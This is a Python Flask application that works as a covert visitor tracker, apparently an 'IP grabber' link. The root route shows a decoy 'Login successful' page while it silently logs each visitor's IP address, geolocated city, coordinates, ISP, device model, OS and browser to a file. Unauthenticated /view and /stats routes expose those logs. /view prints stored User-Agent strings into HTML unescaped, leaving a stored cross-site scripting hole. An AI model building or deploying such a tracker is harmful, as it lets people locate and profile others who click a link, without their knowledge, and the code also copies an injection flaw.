from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import ipaddress
import re
import os

app = Flask(__name__)


# =====================================================
# GET REAL VISITOR IP
# =====================================================

def get_real_ip():

    # Proxy headers
    forwarded = request.headers.get("X-Forwarded-For")

    if forwarded:
        # Example:
        # client_ip, proxy_ip, proxy_ip
        return forwarded.split(",")[0].strip()

    real_ip = request.headers.get("X-Real-IP")

    if real_ip:
        return real_ip.strip()

    return request.remote_addr


# =====================================================
# CHECK PRIVATE IP
# =====================================================

def is_private_ip(ip):

    try:
        return ipaddress.ip_address(ip).is_private

    except Exception:
        return True


# =====================================================
# GEOLOCATION
# =====================================================

def get_geo_info(ip):

    # Private IP
    if is_private_ip(ip):

        return {
            "ip": ip,
            "city": "Private/Local",
            "region": "Private",
            "country": "Private",
            "isp": "Private Network",
            "org": "Private",
            "timezone": "Local",
            "loc": "0,0",
            "postal": "N/A",
            "hostname": "N/A",
            "asn": "N/A"
        }


    # Try ipinfo.io
    try:

        response = requests.get(
            f"https://ipinfo.io/{ip}/json",
            timeout=10
        )

        print("IPINFO STATUS:", response.status_code)

        data = response.json()

        print("IPINFO DATA:", data)

        org = data.get("org", "Unknown")

        # Example:
        # AS12345 Example ISP
        asn = org.split()[0] if org else "N/A"

        return {

            "ip": data.get("ip", ip),

            "city": data.get(
                "city",
                "Unknown"
            ),

            "region": data.get(
                "region",
                "Unknown"
            ),

            "country": data.get(
                "country",
                "Unknown"
            ),

            "isp": org,

            "org": org,

            "timezone": data.get(
                "timezone",
                "Unknown"
            ),

            "loc": data.get(
                "loc",
                "0,0"
            ),

            "postal": data.get(
                "postal",
                "N/A"
            ),

            "hostname": data.get(
                "hostname",
                "N/A"
            ),

            "asn": asn

        }


    except Exception as error:

        print("IPINFO ERROR:", error)


    # Fallback API
    try:

        response = requests.get(

            f"http://ip-api.com/json/{ip}"
            "?fields=status,message,city,regionName,"
            "country,isp,org,timezone,lat,lon,as",

            timeout=10

        )

        data = response.json()

        print("IP-API DATA:", data)


        if data.get("status") == "success":

            return {

                "ip": ip,

                "city": data.get(
                    "city",
                    "Unknown"
                ),

                "region": data.get(
                    "regionName",
                    "Unknown"
                ),

                "country": data.get(
                    "country",
                    "Unknown"
                ),

                "isp": data.get(
                    "isp",
                    "Unknown"
                ),

                "org": data.get(
                    "org",
                    "Unknown"
                ),

                "timezone": data.get(
                    "timezone",
                    "Unknown"
                ),

                "loc": (
                    f"{data.get('lat', 0)},"
                    f"{data.get('lon', 0)}"
                ),

                "postal": "N/A",

                "hostname": "N/A",

                "asn": data.get(
                    "as",
                    "N/A"
                )

            }


    except Exception as error:

        print("IP-API ERROR:", error)


    # If both APIs fail

    return {

        "ip": ip,

        "city": "Unknown",

        "region": "Unknown",

        "country": "Unknown",

        "isp": "Unknown",

        "org": "Unknown",

        "timezone": "Unknown",

        "loc": "0,0",

        "postal": "N/A",

        "hostname": "N/A",

        "asn": "N/A"

    }


# =====================================================
# BROWSER / DEVICE INFORMATION
# =====================================================

def get_browser_info(user_agent):

    ua = user_agent.lower()


    # -------------------------
    # BROWSER
    # -------------------------

    if "edg" in ua:

        browser = "Microsoft Edge"

        match = re.search(
            r"edg/([\d.]+)",
            ua
        )

        version = (
            match.group(1)
            if match
            else
            "Unknown"
        )


    elif "opr" in ua or "opera" in ua:

        browser = "Opera"

        match = re.search(
            r"opr/([\d.]+)",
            ua
        )

        version = (
            match.group(1)
            if match
            else
            "Unknown"
        )


    elif "chrome" in ua:

        browser = "Google Chrome"

        match = re.search(
            r"chrome/([\d.]+)",
            ua
        )

        version = (
            match.group(1)
            if match
            else
            "Unknown"
        )


    elif "firefox" in ua:

        browser = "Mozilla Firefox"

        match = re.search(
            r"firefox/([\d.]+)",
            ua
        )

        version = (
            match.group(1)
            if match
            else
            "Unknown"
        )


    elif "safari" in ua:

        browser = "Apple Safari"

        match = re.search(
            r"version/([\d.]+)",
            ua
        )

        version = (
            match.group(1)
            if match
            else
            "Unknown"
        )


    elif "whatsapp" in ua:

        browser = "WhatsApp Browser"
        version = "Unknown"


    elif "instagram" in ua:

        browser = "Instagram Browser"
        version = "Unknown"


    elif "facebook" in ua:

        browser = "Facebook Browser"
        version = "Unknown"


    else:

        browser = "Unknown Browser"
        version = "Unknown"


    # -------------------------
    # OPERATING SYSTEM
    # -------------------------

    if "android" in ua:

        match = re.search(
            r"android ([\d.]+)",
            ua
        )

        os_name = (
            f"Android {match.group(1)}"
            if match
            else
            "Android"
        )


    elif "iphone" in ua:

        os_name = "iOS iPhone"


    elif "ipad" in ua:

        os_name = "iOS iPad"


    elif "windows" in ua:

        os_name = "Windows"


    elif "mac os" in ua:

        os_name = "macOS"


    elif "linux" in ua:

        os_name = "Linux"


    else:

        os_name = "Unknown OS"


    # -------------------------
    # DEVICE TYPE
    # -------------------------

    if "iphone" in ua or "mobile" in ua:

        device_type = "Mobile Phone"


    elif "ipad" in ua or "tablet" in ua:

        device_type = "Tablet"


    elif (
        "windows" in ua
        or "mac" in ua
        or "linux" in ua
    ):

        device_type = "Desktop Computer"


    else:

        device_type = "Unknown Device"


    # -------------------------
    # DEVICE MODEL
    # -------------------------

    if "samsung" in ua or "sm-" in ua:

        match = re.search(
            r"sm-([a-z0-9]+)",
            ua
        )

        device_model = (

            f"Samsung Galaxy "
            f"{match.group(1).upper()}"

            if match

            else

            "Samsung Galaxy"

        )


    elif "pixel" in ua:

        device_model = "Google Pixel"


    elif "oneplus" in ua:

        device_model = "OnePlus"


    elif "xiaomi" in ua:

        device_model = "Xiaomi"


    elif "iphone" in ua:

        device_model = "iPhone"


    elif "ipad" in ua:

        device_model = "iPad"


    else:

        device_model = "Unknown"


    return {

        "browser": browser,

        "browser_version": version,

        "os": os_name,

        "device_type": device_type,

        "device_model": device_model,

        "full_ua": user_agent

    }


# =====================================================
# SUCCESS PAGE
# =====================================================

SUCCESS_PAGE = """

<!DOCTYPE html>

<html>

<head>

    <meta charset="UTF-8">

    <title>Login successful</title>

</head>

<body>

    Login successful

</body>

</html>

"""


# =====================================================
# MAIN ROUTE
# =====================================================

@app.route("/")
def index():

    # Get visitor IP
    ip = get_real_ip()

    print("\n")
    print("=" * 70)
    print("NEW VISITOR")
    print("=" * 70)

    print("DETECTED IP:", ip)


    # Get geolocation
    geo = get_geo_info(ip)


    # Get User-Agent
    user_agent = request.headers.get(
        "User-Agent",
        "Unknown"
    )


    # Browser information
    browser = get_browser_info(
        user_agent
    )


    # Time
    timestamp = datetime.now().strftime(
        "%Y-%m-%d %H:%M:%S"
    )


    # Print information

    print("\nNETWORK INFORMATION")
    print("-" * 50)

    print("IP:", ip)

    print(
        "Hostname:",
        geo["hostname"]
    )

    print(
        "ASN:",
        geo["asn"]
    )


    print("\nLOCATION INFORMATION")
    print("-" * 50)

    print(
        "City:",
        geo["city"]
    )

    print(
        "Region:",
        geo["region"]
    )

    print(
        "Country:",
        geo["country"]
    )

    print(
        "Postal:",
        geo["postal"]
    )

    print(
        "Timezone:",
        geo["timezone"]
    )

    print(
        "Coordinates:",
        geo["loc"]
    )


    print("\nISP INFORMATION")
    print("-" * 50)

    print(
        "ISP:",
        geo["isp"]
    )

    print(
        "Organization:",
        geo["org"]
    )


    print("\nDEVICE INFORMATION")
    print("-" * 50)

    print(
        "Device:",
        browser["device_type"]
    )

    print(
        "Model:",
        browser["device_model"]
    )

    print(
        "OS:",
        browser["os"]
    )


    print("\nBROWSER INFORMATION")
    print("-" * 50)

    print(
        "Browser:",
        browser["browser"]
    )

    print(
        "Version:",
        browser["browser_version"]
    )


    print("\nUSER-AGENT")
    print("-" * 50)

    print(user_agent)


    print("\nTIME")
    print("-" * 50)

    print(timestamp)


    print("\n" + "=" * 70)


    # Save log

    with open(
        "visitors_log.txt",
        "a",
        encoding="utf-8"
    ) as file:

        file.write("\n")
        file.write("=" * 70)
        file.write("\n")

        file.write(
            f"TIME: {timestamp}\n"
        )

        file.write(
            f"IP: {ip}\n"
        )

        file.write(
            f"CITY: {geo['city']}\n"
        )

        file.write(
            f"REGION: {geo['region']}\n"
        )

        file.write(
            f"COUNTRY: {geo['country']}\n"
        )

        file.write(
            f"ISP: {geo['isp']}\n"
        )

        file.write(
            f"ORG: {geo['org']}\n"
        )

        file.write(
            f"ASN: {geo['asn']}\n"
        )

        file.write(
            f"LOCATION: {geo['loc']}\n"
        )

        file.write(
            f"DEVICE: {browser['device_type']}\n"
        )

        file.write(
            f"MODEL: {browser['device_model']}\n"
        )

        file.write(
            f"OS: {browser['os']}\n"
        )

        file.write(
            f"BROWSER: {browser['browser']}\n"
        )

        file.write(
            f"USER-AGENT: {user_agent}\n"
        )

        file.write(
            "=" * 70
        )

        file.write("\n")


    return render_template_string(
        SUCCESS_PAGE
    )


# =====================================================
# VIEW LOGS
# =====================================================

@app.route("/view")
def view():

    try:

        with open(
            "visitors_log.txt",
            "r",
            encoding="utf-8"
        ) as file:

            content = file.read()


        return f"""

        <!DOCTYPE html>

        <html>

        <head>

            <title>Visitor Logs</title>

        </head>

        <body>

            <h1>Visitor Logs</h1>

            <pre>{content}</pre>

        </body>

        </html>

        """


    except FileNotFoundError:

        return "No logs yet."


# =====================================================
# STATISTICS
# =====================================================

@app.route("/stats")
def stats():

    try:

        with open(
            "visitors_log.txt",
            "r",
            encoding="utf-8"
        ) as file:

            content = file.read()


        total_visitors = content.count(
            "TIME:"
        )


        ips = re.findall(
            r"IP: (.*?)\n",
            content
        )


        unique_ips = len(
            set(ips)
        )


        return f"""

        <!DOCTYPE html>

        <html>

        <head>

            <title>Statistics</title>

        </head>

        <body>

            <h1>Statistics</h1>

            <h2>
                Total Visitors:
                {total_visitors}
            </h2>

            <h2>
                Unique IPs:
                {unique_ips}
            </h2>

        </body>

        </html>

        """


    except FileNotFoundError:

        return "No data yet."


# =====================================================
# START SERVER
# =====================================================

if __name__ == "__main__":

    port = int(
        os.environ.get(
            "PORT",
            5000
        )
    )


    app.run(

        host="0.0.0.0",

        port=port,

        debug=False

    )
